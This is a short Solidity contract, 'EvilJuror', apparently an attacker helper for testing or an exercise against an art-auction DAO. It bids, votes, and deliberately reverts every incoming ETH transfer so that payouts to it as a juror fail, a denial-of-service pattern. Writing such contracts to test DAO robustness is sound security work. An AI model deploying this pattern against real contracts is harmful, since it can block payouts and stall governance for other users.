pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface DAO {
    enum VoteOption {
        None,
        Artist,
        Buyer,
        Neither
    }
    function bid(uint256) external;
    function vote(uint256, uint8) external;
}

contract  EvilJuror is IERC721Receiver {

    DAO artdao;
    constructor (address dao) payable {
        artdao = DAO(dao);
    }

    function makebid(uint256 val) public payable {
         (bool sent, bytes memory data) = address(artdao).call{value: 100}(abi.encodeWithSignature("bid(uint256)", val));
            require(sent, "Failed to bid");
    }

    function justvote(uint256 id) public {
       (bool sent, bytes memory data) = address(artdao).call(abi.encodeWithSignature("vote(uint256,uint8)", id, 2));
        require(sent, "Failed to vote");
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    // reverts on eth transfer when is juror
    receive() external payable {
        revert("i'm evil");
    }
}